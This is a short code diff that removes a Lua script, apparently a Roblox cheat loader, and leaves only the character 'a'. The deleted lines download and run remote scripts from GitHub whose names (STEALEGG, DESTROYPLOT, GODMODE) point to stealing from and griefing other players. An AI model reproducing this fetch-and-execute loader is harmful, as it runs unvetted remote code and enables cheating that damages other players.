@@ -1,15 +1,1 @@
-local function Execute(url)
-    task.spawn(function()
-        local ok, err = pcall(function()
-            loadstring(game:HttpGet(url, true))()
-        end)
-
-        if not ok then
-            warn(err)
-        end
-    end)
-end
-
-Execute("https://raw.githubusercontent.com/juraganzenx/SAG/refs/heads/main/STEALEGG")
-Execute("https://raw.githubusercontent.com/juraganzenx/SAG/refs/heads/main/DESTROYPLOT")
-Execute("https://raw.githubusercontent.com/juraganzenx/SAG/refs/heads/main/GODMODE")
+a
